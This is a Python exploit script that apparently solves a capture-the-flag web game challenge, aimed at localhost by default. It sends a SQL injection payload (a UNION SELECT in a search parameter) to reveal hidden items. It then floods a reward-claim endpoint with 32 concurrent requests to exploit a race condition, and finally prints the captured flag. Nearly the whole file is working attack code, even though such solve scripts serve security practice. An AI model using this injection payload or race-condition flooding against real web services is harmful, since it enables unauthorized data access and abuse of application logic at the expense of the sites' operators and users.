#!/usr/bin/env python3
import concurrent.futures
import sys
import requests

base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
session = requests.Session()
run = session.post(f"{base}/api/runs").json()["run"]
payload = "%' UNION SELECT id,name,rarity,description FROM augments -- "
session.get(f"{base}/api/augments/search", params={"q": payload}).raise_for_status()
session.post(f"{base}/api/augments/choose", json={"augment_id": "darkin-contract"}).raise_for_status()

while session.get(f"{base}/api/state").json()["run"]["stage"] != "shop":
    response = session.post(f"{base}/api/game/action", json={"action": "q"}).json()
    if not response.get("ok"):
        raise SystemExit(response)

cookies = session.cookies.get_dict()
def claim(_):
    return requests.post(f"{base}/api/rewards/hero/claim", cookies=cookies, timeout=10).status_code
with concurrent.futures.ThreadPoolExecutor(max_workers=32) as pool:
    list(pool.map(claim, range(32)))

buy = session.post(f"{base}/api/shop/batch-buy", json={"item_ids": ["heartsteel"] * 4 + ["bloodmail"] * 4}).json()
if not buy.get("ok"):
    raise SystemExit(buy)
session.post(f"{base}/api/boss/start").raise_for_status()
for _ in range(3):
    result = session.post(f"{base}/api/game/action", json={"action": "q"}).json()
if "flag" not in result:
    raise SystemExit(result)
print(result["flag"])
